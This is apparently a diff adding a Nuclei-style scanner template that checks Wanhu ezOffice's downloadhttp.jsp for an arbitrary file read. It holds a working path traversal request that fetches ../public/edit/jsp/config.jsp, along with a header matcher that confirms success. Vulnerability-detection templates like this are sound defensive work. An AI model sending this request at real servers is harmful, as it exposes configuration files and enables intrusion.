@@ -1,0 +1,20 @@
+id: wanhu-ezoffice-downloadhttp-jsp-filedownload
+ 
+info:
+  name: "万户ezoffice downloadhttp.jsp 任意文件读取漏洞"
+  author: sm
+  severity: critical
+  tags: 万户ezoffice
+ 
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp"
+      
+    stop-at-first-match: true
+    redirects: true
+    matchers:
+      - type: word
+        words:
+          - "Content-Disposition: attachment; filename=\"../public/edit/jsp/config.jsp\""
+        part: header
